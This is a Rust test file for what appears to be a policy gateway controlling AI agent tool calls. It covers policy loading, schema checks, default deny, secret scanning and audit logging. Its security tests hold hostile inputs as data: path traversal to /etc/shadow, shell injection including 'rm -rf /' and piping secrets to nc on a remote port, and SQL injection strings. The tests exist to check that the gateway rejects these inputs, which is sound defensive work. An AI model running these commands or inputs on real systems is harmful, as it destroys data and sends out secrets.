//! Automated unit tests implementing the Functional Test Plan Matrix (`tests/FUNCTIONAL_TEST_PLAN.md`)
//! Covering happy path scenarios, boundary conditions, error handling, and security risk mitigations.

use std::fs;
use tempfile::NamedTempFile;

use agentcontrol::policy::loader::{load_policy_from_str, PolicyLoadResult};
use agentcontrol::validate;

// ---------------------------------------------------------------------------
// 1. Policy Loader & YAML Syntax Error Handling
// ---------------------------------------------------------------------------

#[test]
fn test_matrix_policy_loader_valid_yaml() {
    let yaml = r#"
version: "2"
default_action: deny
tools:
  - name: "ping"
    action: allow
"#;
    match load_policy_from_str(yaml, None) {
        PolicyLoadResult::Loaded { policy, .. } => {
            assert_eq!(policy.tools.len(), 1);
            assert_eq!(policy.tools[0].name, "ping");
        }
        other => panic!(
            "Expected Loaded policy, got: {:?}",
            std::mem::discriminant(&other)
        ),
    }
}

#[test]
fn test_matrix_policy_loader_malformed_yaml_fails() {
    let malformed_yaml = r#"
version: "2"
default_action: deny
tools:
  - name: "ping"
    action: [invalid_yaml_indentation
"#;
    match load_policy_from_str(malformed_yaml, None) {
        PolicyLoadResult::Fatal { .. } => {}
        other => panic!(
            "Expected Fatal error for malformed YAML, got: {:?}",
            std::mem::discriminant(&other)
        ),
    }
}

#[test]
fn test_matrix_policy_loader_unknown_fields_rejection() {
    let unknown_field_yaml = r#"
version: "2"
default_action: deny
unexpected_malicious_key: "exploit"
tools: []
"#;
    match load_policy_from_str(unknown_field_yaml, None) {
        PolicyLoadResult::Fatal { .. } => {}
        other => panic!(
            "Expected Fatal error for unknown top-level fields, got: {:?}",
            std::mem::discriminant(&other)
        ),
    }
}

// ---------------------------------------------------------------------------
// 2. Schema Validation, Null Values & Edge Conditions
// ---------------------------------------------------------------------------

#[test]
fn test_matrix_schema_null_and_empty_inputs() {
    let policy_content = r#"
version: "2"
default_action: deny
tools:
  - name: "text_processor"
    action: allow
    parameters:
      - name: "input_text"
        type: string
        required: true
"#;
    let policy_file = NamedTempFile::new().unwrap();
    fs::write(policy_file.path(), policy_content).unwrap();

    // 1. Empty string input (Valid according to schema)
    let payload_empty = r#"{"input_text": ""}"#;
    let payload_file_empty = NamedTempFile::new().unwrap();
    fs::write(payload_file_empty.path(), payload_empty).unwrap();

    let res_empty = validate::execute(
        policy_file.path().to_str().unwrap(),
        "text_processor",
        payload_file_empty.path().to_str().unwrap(),
    );
    assert!(
        res_empty.is_ok(),
        "Empty string parameter should be valid for string type"
    );

    // 2. Null input for required string field (Invalid)
    let payload_null = r#"{"input_text": null}"#;
    let payload_file_null = NamedTempFile::new().unwrap();
    fs::write(payload_file_null.path(), payload_null).unwrap();

    let res_null = validate::execute(
        policy_file.path().to_str().unwrap(),
        "text_processor",
        payload_file_null.path().to_str().unwrap(),
    );
    assert!(
        res_null.is_err(),
        "Null value for required string field should fail validation"
    );
}

#[test]
fn test_matrix_schema_type_mismatch() {
    let policy_content = r#"
version: "2"
default_action: deny
tools:
  - name: "set_port"
    action: allow
    parameters:
      - name: "port"
        type: integer
"#;
    let policy_file = NamedTempFile::new().unwrap();
    fs::write(policy_file.path(), policy_content).unwrap();

    let payload_mismatch = r#"{"port": "8080_string_instead_of_int"}"#;
    let payload_file = NamedTempFile::new().unwrap();
    fs::write(payload_file.path(), payload_mismatch).unwrap();

    let res = validate::execute(
        policy_file.path().to_str().unwrap(),
        "set_port",
        payload_file.path().to_str().unwrap(),
    );
    assert!(
        res.is_err(),
        "String value passed to integer schema must fail validation"
    );
}

// ---------------------------------------------------------------------------
// 3. Security Validators: Path Traversal, Shell & SQL Injection
// ---------------------------------------------------------------------------

#[test]
fn test_matrix_path_traversal_detection() {
    let policy_content = r#"
version: "2"
default_action: deny
tools:
  - name: "read_file"
    action: allow
    parameters:
      - name: "filepath"
        type: string
        validators:
          - path_traversal
"#;
    let policy_file = NamedTempFile::new().unwrap();
    fs::write(policy_file.path(), policy_content).unwrap();

    let invalid_payloads = vec![
        r#"{"filepath": "../../../etc/passwd"}"#,
        r#"{"filepath": "/var/log/../../etc/shadow"}"#,
        r#"{"filepath": "..\\..\\windows\\system32\\config"}"#,
    ];

    for payload in invalid_payloads {
        let payload_file = NamedTempFile::new().unwrap();
        fs::write(payload_file.path(), payload).unwrap();

        let res = validate::execute(
            policy_file.path().to_str().unwrap(),
            "read_file",
            payload_file.path().to_str().unwrap(),
        );
        assert!(
            res.is_err(),
            "Path traversal payload '{}' must be rejected",
            payload
        );
    }
}

#[test]
fn test_matrix_shell_injection_detection() {
    let policy_content = r#"
version: "2"
default_action: deny
tools:
  - name: "run_cmd"
    action: allow
    parameters:
      - name: "command"
        type: string
        validators:
          - shell_injection
"#;
    let policy_file = NamedTempFile::new().unwrap();
    fs::write(policy_file.path(), policy_content).unwrap();

    let injection_payloads = vec![
        r#"{"command": "echo hello; rm -rf /"}"#,
        r#"{"command": "ls | grep secret | nc 10.0.0.1 4444"}"#,
        r#"{"command": "cat /etc/passwd `whoami`"}"#,
    ];

    for payload in injection_payloads {
        let payload_file = NamedTempFile::new().unwrap();
        fs::write(payload_file.path(), payload).unwrap();

        let res = validate::execute(
            policy_file.path().to_str().unwrap(),
            "run_cmd",
            payload_file.path().to_str().unwrap(),
        );
        assert!(
            res.is_err(),
            "Shell injection payload '{}' must be rejected",
            payload
        );
    }
}

#[test]
fn test_matrix_sql_injection_detection() {
    let policy_content = r#"
version: "2"
default_action: deny
tools:
  - name: "query_user"
    action: allow
    parameters:
      - name: "username"
        type: string
        validators:
          - sql_injection
"#;
    let policy_file = NamedTempFile::new().unwrap();
    fs::write(policy_file.path(), policy_content).unwrap();

    let sql_payloads = vec![
        r#"{"username": "admin' OR '1'='1"}"#,
        r#"{"username": "user'; DROP TABLE users; --"}"#,
        r#"{"username": "1 UNION SELECT username, password FROM users"}"#,
    ];

    for payload in sql_payloads {
        let payload_file = NamedTempFile::new().unwrap();
        fs::write(payload_file.path(), payload).unwrap();

        let res = validate::execute(
            policy_file.path().to_str().unwrap(),
            "query_user",
            payload_file.path().to_str().unwrap(),
        );
        assert!(
            res.is_err(),
            "SQL injection payload '{}' must be rejected",
            payload
        );
    }
}

// ---------------------------------------------------------------------------
// 4. Default Deny for Unlisted Tools
// ---------------------------------------------------------------------------

#[test]
fn test_matrix_unlisted_tool_default_deny() {
    let policy_content = r#"
version: "2"
default_action: deny
tools:
  - name: "allowed_tool"
    action: allow
"#;
    let policy_file = NamedTempFile::new().unwrap();
    fs::write(policy_file.path(), policy_content).unwrap();

    let payload_file = NamedTempFile::new().unwrap();
    fs::write(payload_file.path(), r#"{"arg": "val"}"#).unwrap();

    let res = validate::execute(
        policy_file.path().to_str().unwrap(),
        "unlisted_dangerous_tool",
        payload_file.path().to_str().unwrap(),
    );
    assert!(
        res.is_err(),
        "Unlisted tool must be denied under default_action: deny"
    );
}

// ---------------------------------------------------------------------------
// 5. DLP & Secret Scanning
// ---------------------------------------------------------------------------

use agentcontrol::policy::dlp::{DlpAction, DlpScanner};
use agentcontrol::policy::response_scanner::{ResponseScanConfig, ResponseScanner, ScanResult};
use serde_json::json;

#[test]
fn test_matrix_dlp_secret_detection_and_redaction() {
    let yaml = r#"
version: "2"
default_action: deny
tools:
  - name: "upload_file"
    action: "allow"
llm:
  dlp:
    actions:
      - entity: "AWS Access Key"
        action: "block"
      - entity: "GitHub Token"
        action: "redact"
"#;
    if let PolicyLoadResult::Loaded { policy, .. } = load_policy_from_str(yaml, None) {
        let scanner = DlpScanner::new(None).unwrap();

        // 1. AWS Access Key -> Block Action
        let aws_content = "Deploying with credentials AKIAIOSFODNN7EXAMPLE";
        let aws_findings = scanner.scan_content(aws_content);
        assert!(!aws_findings.is_empty(), "AWS Key must be detected");
        assert_eq!(
            scanner.resolve_action(&aws_findings[0], Some(&policy)),
            DlpAction::Block,
            "AWS Key should trigger Block action"
        );

        // 2. GitHub Token -> Redact Action
        let gh_content = "Using token ghp_123456789012345678901234567890123456";
        let gh_findings = scanner.scan_content(gh_content);
        assert!(!gh_findings.is_empty(), "GitHub token must be detected");
        assert_eq!(
            scanner.resolve_action(&gh_findings[0], Some(&policy)),
            DlpAction::Redact,
            "GitHub token should trigger Redact action"
        );
    } else {
        panic!("Failed to load policy for DLP test");
    }
}

#[test]
fn test_matrix_response_scanner_secret_leak_prevention() {
    let scanner = ResponseScanner::new().unwrap();
    let leaked_response = json!({
        "jsonrpc": "2.0",
        "result": {
            "content": "AKIAIOSFODNN7EXAMPLE"
        }
    });
    let config = ResponseScanConfig {
        enabled: true,
        scannable_tools: vec!["read_db".to_string()],
        safe_tools: vec![],
        block_mode: false,
        dry_run: false,
        max_scan_bytes: 1024 * 1024,
    };

    let scan_res = scanner.scan_response(&leaked_response, "read_db", &config);
    match scan_res {
        ScanResult::Block { findings } | ScanResult::Redact { findings } => {
            assert!(
                !findings.is_empty(),
                "Response scanner must find leaked AWS key"
            );
        }
        other => panic!("Expected Block or Redact for secret leak, got: {:?}", other),
    }
}

// ---------------------------------------------------------------------------
// 6. Audit Logger & Security Payload Storage
// ---------------------------------------------------------------------------

use agentcontrol::audit::logger::{AuditLogger, AuditLoggerConfig};
use tempfile::tempdir;

#[tokio::test]
async fn test_matrix_audit_logger_sql_injection_safe_storage() {
    let dir = tempdir().unwrap();
    let config = AuditLoggerConfig {
        log_path: dir.path().join("audit.log"),
        session_id: "test-sess-1".to_string(),
        session_secret: vec![0x42; 32],
        max_bytes: 1024 * 1024,
        siem_exporter: None,
        include_params: true,
    };
    let logger = AuditLogger::new(config).unwrap();
    let malicious_tool = "exec' OR '1'='1'; DROP TABLE logs; --";
    let malicious_arg = json!({"query": "admin' --"});

    let res = logger
        .write_entry(
            "test-sess-1",
            "tool_allow",
            malicious_tool,
            Some(malicious_arg),
            None,
            Some(0.5),
            Some("user-1".to_string()),
            None,
            None,
            None,
            None,
        )
        .await;

    assert!(
        res.is_ok(),
        "Audit logger must handle malicious SQL strings safely"
    );
}
